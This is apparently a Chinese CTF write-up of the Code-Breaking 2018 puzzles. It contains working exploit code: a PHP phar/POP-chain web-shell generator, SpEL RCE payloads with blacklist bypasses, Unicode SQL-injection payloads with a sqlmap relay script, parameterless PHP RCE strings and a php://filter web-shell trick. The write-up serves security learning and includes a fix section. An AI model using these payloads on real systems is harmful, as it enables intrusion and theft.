---
title: "Code-Breaking 审计记录[7/9]"
slug: fnxs1w
translationKey: fnxs1w
date: 2021-01-15T11:41:35+08:00
source: yuque/penetration
---

地址：[https://code-breaking.com/intro/](https://code-breaking.com/intro/)



# 0x08 picklecode
> Hard
>

首先，需要补充以下格式化字符串漏洞的知识，见[https://blog.csdn.net/wenrennaoda/article/details/107224921](https://blog.csdn.net/wenrennaoda/article/details/107224921)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616577688195-b70effd9-bea3-41b0-8b3e-edc0c6243470.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616577704562-5b14b519-e316-4e14-a2ed-c5b355aa4302.png)

的确是存在格式化字符串漏洞的。那首先就要利用此洞来泄露`Django`的`SECRET_KEY`，这可以通过本地PHPCharm搭建环境来找到

Python Web之flask session&格式化字符串漏洞

[https://xz.aliyun.com/t/3569](https://xz.aliyun.com/t/3569)

客户端 session 导致的安全问题 | 离别歌

https://www.leavesongs.com/PENETRATION/client-session-security.html

Python 格式化字符串漏洞（Django为例）

[https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html#django](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html#django)

```basic

```



其次呢，要绕过pickle的一些函数限制。

# 0x07 lumenserial
[lumenserial.zip](https://www.yuque.com/attachments/yuque/0/2021/zip/166008/1616413359107-e21c4c5b-fa23-476a-94eb-80b21eb6d994.zip)

类似于Laravel框架，首先分析路由：

```basic
// code-breaking\2018\lumenserial\cat\app\Http\Controllers\EditorController.php
public function main(Request $request)
    {
        $action = $request->query('action');

        try {
            if (is_string($action) && method_exists($this, "do{$action}")) {
                return call_user_func([$this, "do{$action}"], $request);
            } else {
                throw new FileException('Method error');
            }
        } catch (FileException $e) {
            return response()->json(['state' => $e->getMessage()]);
        }
    }
```

就是说`/server/editor?action=listimage`，代表调用`dolistimage()`

```php
<?php
protected function doCatchimage(Request $request)
    {
        $sources = $request->input($this->config['catcherFieldName']);//source
        $rets = [];

        if ($sources) {
            foreach ($sources as $url) {
                $rets[] = $this->download($url);
            }
        }

        return response()->json([
            'state' => 'SUCCESS',
            'list' => $rets
        ]);
    }
```

此功能的作用是，利用`file_gut_contents()`抓取图片，利用gd库确认是图片之后，保存到本地。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616058599817-e45bc7ea-ec66-4623-9b5b-53f3bb5aaff2.png)

`file_gut_contents()`函数，会对`phar://`协议的文件，进行一次phar反序列化。所以我们当前的目标，变为找POP链子

## 寻找POP链
首先，要把源码下全。`conposer install`拉一下源码。

其次，关注目标环境。目标环境是PHP 7.2，此时assert函数不能用，

> When migrating older code to PHP 7.2+, you may get E_DEPRECATED warnings for every call to assert() you ever wrote, urging you to not pass the assertion as a string.
>

See：[https://www.php.net/manual/zh/function.assert.php](https://www.php.net/manual/zh/function.assert.php)



且disable了以下函数

```basic
disable_functions = system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log
```

参考[PHP反序列化入门之寻找POP链（一）](https://www.freebuf.com/articles/web/203767.html)



pop链子x1,kingkk大佬nb，这下面的`call_user_func_array(array($this->generator, $name), $arguments);`还是不太理解，先按住。

```basic
<?php
//
/**
 * @Author: King kaki
 * @Date:   2018-12-03 20:48:26
 * @Last Modified by:   King kaki
 * @Last Modified time: 2018-12-04 21:18:08
 */

namespace Illuminate\Broadcasting{
	class PendingBroadcast{
		function __construct(){
			$this->events = new \Faker\ValidGenerator();
			$this->event = 'kingkk';
		}
	}
}


namespace PHPUnit\Framework\MockObject\Invocation{
	class StaticInvocation{
		function __construct(){
			$this->parameters = array('./k.php','<?php phpinfo();eval($_POST["k"]);?>');
		}
	}
}

namespace PHPUnit\Framework\MockObject\Stub{
	class ReturnCallback{
		function __construct(){
			$this->callback = 'file_put_contents';
		}
	}
}

namespace Faker{
	class ValidGenerator{
		function __construct(){
			$si = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();
			$g1 = new \Faker\Generator(array('kingkk' => $si ));
			$g2 = new \Faker\Generator(array("dispatch" => array($g1, "getFormatter")));

			$rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();

			$this->validator = array($rc, "invoke");
			$this->generator = $g2;
			$this->maxRetries = 10000;
		}
	}

	class Generator{
        function __construct($form){
            $this->formatters = $form;
        }
	}

}

	$exp = new Illuminate\Broadcasting\PendingBroadcast();
	print_r(urlencode(serialize($exp)));

	// phar
	$p = new Phar('./k.phar', 0);
    $p->startBuffering();
    $p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
    $p->setMetadata($exp);
    $p->addFromString('1.txt','text');
    $p->stopBuffering();


```

这里是分析

首先，是`PendingBroadcast`里的`__construct`与`__destruct`，分别完成了赋值、调用的逻辑。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616412159459-b227ce5c-47a6-4655-8d29-ebe82b59f8f3.png)

其实，本心上，如果是` $this->events($this->event);`这样的嵌套调用，那么直接`eval(param)`就可以RCE，没什么好说的。但并不是，涉及到`dispatch`，这里既可以找有`dispatch`方法的类来作跳板，也可以找有理想`_call`方法的类。

（但很可惜，并没有这样理想的类)

此外，由于并不能直接用命令执行的函数来RCE，因此要考虑写shell——PHP中写shell，`file_put_contents`是最好的选择了，因为不涉及句柄。

实际上，`call_user_func_array`就是干这个活儿的，只要能控制它的第二参数为数组，那就乱杀了。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616572951966-b8cfe724-fc0b-4e3b-845b-e69a8c6b44cc.png)



![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616573285173-80c0c614-c659-4b7a-b17a-93a8976edb11.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616573363483-c6833a9d-0cab-45bf-a907-031ecdc43091.png)

Ref

+ [https://www.freebuf.com/articles/web/203767.html](https://www.freebuf.com/articles/web/203767.html)
+ [https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/](https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/)

# 0x06 javacon
## 解题过程
正常登录时的请求包（username、password参数）

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1614219147757-ad4a7574-d7c7-4c0e-9379-fe9b502c384a.png)

我们来查看源码

io.tricking.challenge.MainController

```java
@PostMapping({"/login"})
  public String login(@RequestParam(value = "username", required = true) String username, @RequestParam(value = "password", required = true) String password, @RequestParam(value = "remember-me", required = false) String isRemember, HttpSession session, HttpServletResponse response) {
    if (this.userConfig.getUsername().contentEquals(username) && this.userConfig.getPassword().contentEquals(password)) {
      session.setAttribute("username", username);
      if (isRemember != null && !isRemember.equals("")) {
        Cookie c = new Cookie("remember-me", this.userConfig.encryptRememberMe());
        c.setMaxAge(2592000);
        response.addCookie(c);
      } 
      return "redirect:/";
    } 
    return "redirect:/login-error";
  }
```

注意到第5~8行，处理了remember-me参数，那么我们试着添加这个参数

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1614219201571-33c87198-0895-4f04-b10e-f05e013180ff.png)

那么再看看这个可控点[https://github.com/phith0n/code-breaking/blob/master/2018/javacon/admin-panel/src/main/java/io/tricking/challenge/MainController.java](https://github.com/phith0n/code-breaking/blob/master/2018/javacon/admin-panel/src/main/java/io/tricking/challenge/MainController.java)

其中的`getAdvanceValue`函数会对传入的表达式进行SpEL解析（红框部分）

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1615778676288-eac48845-00b4-45c0-895c-206676bf6057.png)

全局查找调用

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1615778483336-2e50569d-d05c-48a8-b6ee-4a74961f0cd6.png)发现漏洞点，整个的参数传递逻辑，可以说是很清楚的。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1615778634453-ac55d459-0561-4b7a-a163-fe60bae9346e.png)

所以，实际上思路归结起来，

1. 服务器会解析我们输入的SpEL表达式，不过由于中间存在一个加密、解密的过程，我们需要加密payload才能大成功，这个加密的过程在本地完成。



2. 单纯的SpEL表达式，其实用来RCE并不难，只需要下面任意一个Payload即可。

```java
new java.lang.ProcessBuilder("calc").start()
T(java.lang.Runtime).getRuntime().exec("calc")
''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')
    
    # PoC
    T(Thread).sleep(10000)

```

难的是此处的黑名单，需要绕过

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1615987677277-9e7e3a87-877c-42f0-ac00-e458aa3433bd.png)

正则过滤了`java.+lang`, `Runtime`，以及`exec.+\(`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1615987621082-63890017-e294-4ef8-9783-b1ec3a1e2755.png)

### 一、SpEL调用反射的4点铺垫
首先铺垫几点.:

1. `**<u>getClass()</u>**`<u> 方法，用于获取对象的类。</u>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1615992053259-f778fe99-5994-483c-94f5-d37247f88ab3.png)

> 注意：也可以使用T标记，即“类类型表达式”，
>
> `T(String)`
>

---

2. `**<u>Class.forName()</u>**`<u><font style="color:#333333;"> 方法的作用，就是初始化给定的类</font></u><font style="color:#333333;">。如</font>`<font style="color:#333333;">Class.forName('java.lang.String')</font>`<font style="color:#333333;">就是获取了</font>`<font style="color:#333333;">j</font>``<font style="color:#333333;">ava.lang.String</font>`<font style="color:#333333;">类</font>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1615988360920-7f54d5b5-48b8-4935-995b-326ca2113818.png)

> 注意：这个方法常用来“跳类”，即从一个类，跳到另外一个类。我们常用来实现`String`->`Runtime`
>

---

3. `**<u>getMethod(ClassName, parameterTypes)</u>**`<u>，获得对象所声明的公开方法。</u>

该方法的第一个参数是要获得**方法的名字**，第二个参数`parameterTypes`是该方法所**接受参数的类型**。

```java
# execMethod 两种不同
''.getClass().getMethod("run", String.class)
''.getClass().forName('java.lang.Runtime').getMethod("exec", ''.getClass())
```



如果直接执行`exec`，应该是`getRuntime().exec("calc")`，但如果是用`invoke`来调用就应该这样

```java
execMethod.invoke(
	getRuntimeMethod.invoke(null), 		// $1, [object] you are making a method call against
	"param"		 						// $2, [parameter] to your method call
)

```

---

4. `**<u>ClazzMethod.invoke(clazz, args)</u>**`，调用实例`clazz`的`ClazzMethod`方法，参考[这儿](https://www.cnblogs.com/onlywujun/p/3519037.html)的例子。

```java
import java.lang.reflect.Method;

public class TestClassLoad {
　　public static void main(String[] args) throws Exception {
　　　　Class<?> clz = Class.forName("A");
　　　　Object obj = clz.newInstance();
　　　　Method met = clz.getMethod("foo", String.class);
　　　　for (int i = 0; i < 16; i++) {
　　　　　　met.invoke(obj, Integer.toString(i));
　　　　}
　　}
}
```



### 二、绕过SpEL黑名单
**最终目标：**反射调用恶意类的恶意方法。由于类名、方法名被黑名单过滤，因此要通过字符串拼接的形式，来绕过黑名单。

```java
# 黑名单：正则过滤了【java.+lang】, 【Runtime】，以及【exec.+\(】
''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')
```

**目标分解：**

**① **先获取到`java.lang.Runtime`类，参考【三、SpEL 的RCE公式】

**②** 再搞一个`java.lang.Runtime`类的实例，

**③** 最后调用它的`exec`方法，

### 三、SpEL 的RCE公式
ref：[https://www.cnblogs.com/poing/p/12837175.html](https://www.cnblogs.com/poing/p/12837175.html)

```java
# 第一部分：反射起点，从语义中获取到某个类。
T(String)
1.getClass()
''.getClass()
{}.getClass()
...
    
    	 # 第二部分：转到恶意类
T(String).forName("java.lang.Runtime")
...
    
    								  # 第三部分：获取恶意方法。记为【execMethod】
T(String).forName("java.lang.Runtime").getMethod('exec', T(String))
... 

```

最后，为了调用方法，我们需要先**把类给****实例化**，也就是下面那段`getRuntimeMethod.invoke(null)`

```java
execMethod.invoke(
	getRuntimeMethod.invoke(null), 		// $1, [object] you are making a method call against
	"param"		 						// $2, [parameter] to your method call
)
```

这里直接给结果：`T(String).forName("java.lang.Runtime").getMethod('getRuntime').invoke(null)`

总结出来，完整的反射就是下面这样

```java
T(String).forName("java.lang.Runtime").getMethod('exec', T(String)).invoke((T(String).forName("java.lang.Runtime").getMethod('getRuntime').invoke(null)), 'calc')
```

但是不要忘记，还有黑名单！

```java
#{T(String).forName('jav'+'a.lang.Run'+'time').getMethod('ex'+'ec', T(String)).invoke((T(String).forName('jav'+'a.lang.Run'+'time').getMethod('getR'+'untime').invoke(null)), 'ls /')}
```

到[这里](http://www.jackson-t.ca/runtime-exec-payloads.html)编码一下即可反弹shell

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1615998650921-8a80cd33-ab3c-42c9-bc6a-c1c2d0de6017.png)

## SpEL（Spring表达式语言）
参考ref：[http://itmyhome.com/spring/expressions.html](http://itmyhome.com/spring/expressions.html)学习下SpEL表达式语言的用法。

> + 尽管有其他可选的 Java 表达式语言，如 OGNL, MVEL,JBoss EL 等等，但 Spel 创建的初衷是了给 Spring 社区提供一种简单而高效的表达式语言，一种可贯穿整个 Spring 产品组的语言。这种语言的特性应基于 Spring 产品的需求而设计。
> + 虽然SpEL引擎作为Spring 组合里的表达式解析的基础 ，但它只依赖于core模块，可以单独使用；
> + 表达式语言给静态Java语言增加了动态功能。
> + **SpEL表达式中的[关键字]是不区分大小写的。**
>

以下内容参考Ref: [https://zhuanlan.zhihu.com/p/174786047](https://zhuanlan.zhihu.com/p/174786047)

### Exploit—代码审计时
一、入口点。全局搜索以下关键字即可（其实`spel`关键字不也行么2333）

```java
org.springframework.expression.spel.standard
```

二、使用了SpEL表达式的值。即是否存在以下调用

```java
expression.getValue()
```

```java
// demo
private String getAdvanceValue(String val) {
    ...
	ParserContext parserContext = new TemplateParserContext();
	Expression exp = parser.parseExpression(val, parserContext);
    SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
    return exp.getValue(evaluationContext).toString();
    
}
```

+ <font style="color:#333333;">要点：在不指定 </font>`EvaluationContext`<font style="color:#333333;"> 时，默认采用的是 </font>`StandardEvaluationContext`

### 解析
使用** ExpressionParser**<font style="color:#666666;"> 基于</font>** ParserContext**<font style="color:#666666;"> 将字符串解析为 Expression， Expression 再根据 EvaluationContext 计算表达式的值，将字符串解析为 Expression</font>

### 接口、模板
> 表示解析器，默认实现是org.springframework.expression.spel.standard包中的SpelExpressionParser类，使用parseExpression方法将字符串表达式转换为Expression对象，对于ParserContext接口用于定义字符串表达式是不是模板，及模板开始与结束字符：
>
> see: [https://zhuanlan.zhihu.com/p/174786047](https://zhuanlan.zhihu.com/p/174786047)
>

```java
public interface ExpressionParser {
 Expression parseExpression(String expressionString) throws ParseException;
 Expression parseExpression(String expressionString, ParserContext context) throws ParseException;
}
```

```basic
@Test
public void testParserContext() {
    ExpressionParser parser = new SpelExpressionParser();
    ParserContext parserContext = new ParserContext() {
        @Override
        public boolean isTemplate() {
            return true;
        }

        @Override
        public String getExpressionPrefix() {
            return "#{";
        }

        @Override
        public String getExpressionSuffix() {
            return "}";
        }
    };
    String template = "#{'Hello '}#{'World!'}";
    Expression expression = parser.parseExpression(template, parserContext);
    System.out.println(expression.getValue());
}
```

<font style="color:#121212;">在此我们演示的是使用ParserContext的情况，此处定义了ParserContext实现：定义表达式是模块，表达式前缀为#{”，后缀为“}”；使用parseExpression解析时传入的模板必须以“#{”开头，以“}”结尾，如</font>`<font style="color:#121212;">"#{'Hello '}#{'World!'}"</font>`

### **正则表达式Regex**
使用“`str matches regex`，如“`'123' matches '\d{3}'`”将返回true；



### **注解风格的配置**
基于注解风格的SpEL配置也非常简单，使用@Value注解来指定SpEL表达式，该注解可以放到字段、方法及方法参数上。

测试Bean类如下，使用@Value来指定SpEL表达式：

```java
public class SpELBean {  
    @Value("#{'Hello' + world}")  
    private String value;  
}
```

### **类类型表达式**
使用“`T(Type)`”来表示java.lang.Class实例，“Type”必须是类全限定名，“java.lang”包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段，例如：

```basic
String randomPhrase = parser.parseExpression(
        "random number is #{T(java.lang.Math).random()}",
        new TemplateParserContext()).getValue(String.class);

// evaluates to "random number is 0.7038186818312008"
```



<font style="color:#121212;">对于</font>`<font style="color:#121212;">java.lang</font>`<font style="color:#121212;">包里的可以直接使用“</font>`<font style="color:#121212;">T(String)</font>`<font style="color:#121212;">”访问；其他包必须是类全限定名；可以进行静态字段访问如“</font>`<font style="color:#121212;">T(Integer).MAX_VALUE”</font>`<font style="color:#121212;">；也可以进行静态方法访问如“</font>`<font style="color:#121212;">T(Integer).parseInt('1')</font>`<font style="color:#121212;">”。</font>

### **类实例化**
类实例化同样使用java关键字“new”，类名必须是全限定名，但java.lang包内的类型除外，如String、Integer。

```java
@Test
public void testConstructorExpression() {
    ExpressionParser parser = new SpelExpressionParser();
    String result1 = parser.parseExpression("new String('路人甲java')").getValue(String.class);
    System.out.println(result1);
    Date result2 = parser.parseExpression("new java.util.Date()").getValue(Date.class);
    System.out.println(result2);
}
```

实例化完全跟Java内方式一样，运行输出

```plain
路人甲java
Tue Aug 03 20:22:43 CST 2020
```



### **表达式模板**
<font style="color:#121212;">在前边我们已经介绍了使用ParserContext接口实现来定义表达式是否是模板及前缀和后缀定义。在此就不多介绍了，如“</font>`<font style="color:#121212;">Error ${#v0} ${#v1}</font>`<font style="color:#121212;">”表达式表示由字面量“</font>`<font style="color:#121212;">Error </font>`<font style="color:#121212;">”、模板表达式“</font>`<font style="color:#121212;">#v0</font>`<font style="color:#121212;">”、模板表达式“</font>`<font style="color:#121212;">#v1</font>`<font style="color:#121212;">”组成，其中v0和v1表示自定义变量，需要在上下文定义。</font>

### <font style="color:#121212;">Fix—漏洞修复</font>
`SimpleEvaluationContext`、`StandardEvaluationContext` 是 SpEL 提供的两个 `EvaluationContext`

> SimpleEvaluationContext （相对安全）- 针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 Spal 语言特性和配置选项的子集。
>
> StandardEvaluationContext （不安全）- 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。
>

+ SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用；
+ 所以最直接的修复方式是使用 SimpleEvaluationContext 替换 StandardEvaluationContext。

下面是例子。首先，定义了解析`SpEL`表达式的控制器，入口点就是`String val`

```java
//MainController.java
package io.tricking.challenge;

import io.tricking.challenge.spel.SmallEvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.ParserContext;
import org.springframework.expression.common.TemplateParserContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;

private String getAdvanceValue(String val) {
    ...
	ParserContext parserContext = new TemplateParserContext();
	Expression exp = parser.parseExpression(val, parserContext);
    SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
    return exp.getValue(evaluationContext).toString();
    
}
```

其次呢，我们关注下这个特别的东西`SmallEvaluationContext`，它的定义是下面这样的

```java
//SmallEvaluationContext.java
package io.tricking.challenge.spel;

import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.spel.support.StandardEvaluationContext;

import java.util.Collections;
import java.util.List;

public class SmallEvaluationContext extends StandardEvaluationContext {
    public void setConstructorResolvers(List<ConstructorResolver> constructorResolvers) { }
    public List<ConstructorResolver> getConstructorResolvers() {
        return Collections.emptyList();
    }
}
```

# 0x05 nodechr
国外的`alphineLinux`源很慢，需要更换成国内源，在`Dockerfile`的`RUN set -ex \`前面加一行

```basic
RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories

```

即可更换。

源代码在此：[https://github.com/phith0n/code-breaking/blob/master/2018/nodechr/www/index.js](https://github.com/phith0n/code-breaking/blob/master/2018/nodechr/www/index.js)

```basic

//登录的逻辑
async function login(ctx, next) {
    if(ctx.method == 'POST') {
        let username = safeKeyword(ctx.request.body['username'])
        let password = safeKeyword(ctx.request.body['password'])

        let jump = ctx.router.url('login')
        if (username && password) {
            let user = await ctx.db.get(`SELECT * FROM "users" WHERE "username" = '${username.toUpperCase()}' AND "password" = '${password.toUpperCase()}'`)

            if (user) {
                ctx.session.user = user

                jump = ctx.router.url('admin')
            }

        }
        
//过滤的逻辑 
 function safeKeyword(keyword) {
    if(isString(keyword) && !keyword.match(/(union|select|;|\-\-)/is)) {
        return keyword
    }

    return undefined
}
```

看出来没？过滤的是username，可传入数据库查询的，却是username.toUpperCase()，这中间就存在差异。

那么思路就明显了，利用SQL注入UNION SELECT查询出flags表中的flag列即可。



## JS的大小写特性
> 在javascript中有几个特殊的字符需要记录一下
>
> 对于toUpperCase():
>
> 对于toLowerCase():
>
> 在绕一些规则的时候就可以利用这几个特殊字符进行绕过
>

```plain
字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"
```

```plain
字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)
```

备注：下面是他们URL编码过后的值

```plain
I  -->  ı  ->  %C4%B1
S  -->  ſ  ->  %C5%BF
 
K  ->  %E2%84%AA
```

很明显，users表有三列，因此直接先上手看能否成功注入

```basic
POST /login/ HTTP/1.1
Host: nodechr
Content-Length: 52
Origin: http://nodechr
Content-Type: application/x-www-form-urlencoded

username=-1&password=' un%C4%B1on %C5%BFelect 1,2,'3
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1614135457047-4f4dee43-69d1-47c6-b303-c61db50a80c3.png)

采用Flask的转发脚本，[地址](https://github.com/hi-unc1e/some_scripts/blob/master/EXPs/sqli-reverse-flask_nodechr.py)在此

```basic
# encoding: utf-8
# sqli-reverse-flask.py

from flask import Flask,request,jsonify
import requests
import urllib.request
import urllib.parse


def remote_login(payload):
    '''
    对服务器发起访问请求
    '''

    burp0_url = "http://nodechr:80/login/"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://nodechr", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 es360messenger/6.6.5-600677 Safari/537.36 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://nodechr/login/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    payload = "1'or %s or'" % payload
    burp0_data = {"username": "admin", "password": payload}
    resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
		return resp.text

app = Flask(__name__)
@app.route('/')
def login():
    payload =  request.args.get("id")
    # I  -->  ı  ->  %C4%B1
    # S  -->  ſ  ->  %C5%BF

    payload = payload.lower()
    payload = payload.replace("i", "ı")
    payload = payload.replace("s", "ſ")

    print(payload)
    response = remote_login(payload)
    return response

if __name__ == '__main__':
    app.run()
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1614147777422-79793fcf-fd8f-4d09-acc6-b44083b44057.png)

```basic
python sqlmap.py -u http://127.0.0.1:5000/?id=1 --dbs --hex -D SQLite_masterdb -T flags -C flag --dump --batch
```

成功跑出结果！

其实根本没那么复杂，



![](https://cdn.nlark.com/yuque/0/2021/png/166008/1614149830475-575941c0-d572-4764-a773-22c37f920da0.png)

最后就是，嫖一张kingkk师傅的[结果](https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/)

```basic
K ---- k
ß(223) ---- SS
ı(305) ---- I
ſ(383) ---- S
ﬀ(64256) ---- FF
ﬁ(64257) ---- FI
ﬂ(64258) ---- FL
ﬃ(64259) ---- FFI
ﬄ(64260) ---- FFL
ﬅ(64261) ---- ST
ﬆ(64262) ---- ST

```

# 0x04 phplimit
```php
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
} else {
    show_source(__FILE__);
}

```

首先，明确这段正则的含义

+ [^\W]+
    - \W代表不在<font style="color:#7B610E;background-color:#F3DB90;">[^a-zA-Z0-9_]</font>范围里的字符
    - ^代表集合取反，也就是在<font style="color:#7B610E;background-color:#F3DB90;">[a-zA-Z0-9_]</font>范围中的字符啦
+ \((?R)?\)
    - 参考[https://www.rexegg.com/regex-recursion.html](https://www.rexegg.com/regex-recursion.html)，代表递归匹配

也就是说：除了最后的分号，参数中只允许函数的嵌套，函数的里面是不允许加参数的=>无参RCE

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1613803478357-e1b6fd45-44bb-47c1-9477-ae9c1c6ef255.png)



## 无参数RCE
### 0x01    利用Cookie
session_id() 可以用来获取/设置当前会话 ID。

那么可以用这个函数来获取cookie中的phpsessionid了，并且这个值我们是可控的。

但其有限制：

> 文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）
>

没事，我们只要数字和字母就可以了，因为可以将我们的参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。

所以，payload可以为：`code=eval(hex2bin(session_id()));`

但session_id必须要开启session才可以使用，所以我们要先使用session_start。

最后，payload：`eval(hex2bin(session_id(session_start())));`

在http头中设置PHPSESSID为想要执行代码的16进制

```http
GET /?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1
Host: localhost
Cookie: PHPSESSID=706870696e666f28293b

```

### 0x02    get_defined_vars 
get_defined_vars 

> get_defined_vars() 函数返回由所有已定义变量所组成的数组。
>
> 版本要求：PHP 4 >= 4.0.4, PHP 5, PHP 7
>

咱们运行var_dump(get_defined_vars());看一下

```http
array(4) { 
["GET"]=> array(1)	{ ["code"]=> string(29) "var_dump(get_defined_vars());" } 
["POST"]=> array(0) { } 
["COOKIE"]=> array(0) { }
["FILES"]=> array(0) { } 
	}
```

接下来就要访问数组，参考[php内置函数分析之current()、next()、prev()、reset()、end()](https://www.cnblogs.com/natian-ws/p/9154264.html)

最终先后使用current, next，取到$_GET['2']的值，将命令执行的参数带外，进而RCE

```http
# scan dir
http://127.0.0.1/?code=eval(next(current(get_defined_vars())));&1=eval($_GET[%272%27]);&2=var_dump(scandir(%27../%27));

# readflag
http://127.0.0.1/?code=eval(next(current(get_defined_vars())));&1=eval($_GET[%272%27]);&2=var_dump(readfile(%27../flag_phpbyp4ss%27));
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1613805895766-82966210-7f18-4ceb-8fb3-3f9d28a479b5.png)



### 0x03    getallheader（apache）
getallheader 

> (PHP 4, PHP 5, PHP 7, PHP 8)
>
> getallheaders — 获取全部 HTTP 请求头信息
>
> getallheaders ( ) : array
>
> 获取当前请求的所有请求头信息。
>
> 此函数是 apache_request_headers()的别名。 请阅读 apache_request_headers() 文档获得更多信息。
>

只能在apache上面使用，此题为nginx环境

```http
Fatal error: Call to undefined function getallheaders() in /var/www/html/index.php(3) : eval()'d code on line 1
```



---

# 0x03 phpmagic
```php
<?php
if(isset($_GET['read-source'])) {
    exit(show_source(__FILE__));
}

define('DATA_DIR', dirname(__FILE__) . '/data/' . md5($_SERVER['REMOTE_ADDR']));

if(!is_dir(DATA_DIR)) {
    mkdir(DATA_DIR, 0755, true);
}
chdir(DATA_DIR);

$domain = isset($_POST['domain']) ? $_POST['domain'] : '';
$log_name = isset($_POST['log']) ? $_POST['log'] : date('-Y-m-d');

if(!empty($_POST) && $domain):
	$command = sprintf("dig -t A -q %s", escapeshellarg($domain));
	$output = shell_exec($command);
	$output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);
	$log_name = $_SERVER['SERVER_NAME'] . $log_name;
  if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) {
  	file_put_contents($log_name, $output);
	}

   echo $output;
           endif; ?>
```

## Tricks
+ `dig`的地址，在执行命令的输出中，是含有输入的值（你懂什么叫**部分可控**了嘛?）。
    - `dig`的地址，有长度限制（`<64`）。
+ `file_put_contents`中，可以在第一个参数中使用`php://`伪协议，来形成base64解码。
    - <font style="color:#333333;">在后缀名后加上</font>`/.`<font style="color:#333333;">，</font>`<font style="color:#333333;">pathinfo</font>`<font style="color:#333333;">就取不到后缀名，就可以正常写入</font>`.php`<font style="color:#333333;">之中。</font>
    - `$_SERVER['SERVER_NAME']`（SERVERNAME）可以被伪造，就是HTTP请求中`HOST`的值。
    - 要构造`php://`，可以先控制 `$_SERVER['SERVER_NAME']`为`PHP`，再在`log_name`中传入`://`，从而拼接出`php://`

```php
://filter/write=convert.base64-decode/resource=0.php/.
```

+ `<font style="color:#333333;">base64</font>`的<font style="color:#333333;">解码，会从可识别的字符开始，每</font>4个byte为一组<font style="color:#333333;">，中途遇到错误不会停止</font>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612860258818-2e53dab8-ef1a-437f-b64f-3bdd71120bc5.png)

<font style="color:#333333;">因此，先构造base64的payload</font>

```php
?─#echo '<?php eval($_POST['cmd']);   ?>' |base64
PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7ICAgPz4K

```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612861618320-3d368d89-aaef-4dcb-8a8f-a0004f30da2d.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612861646142-5d6c797f-3460-4d9a-8e70-25908f4f970c.png)

<font style="color:#333333;">注意到</font>disable_functions如下

```php
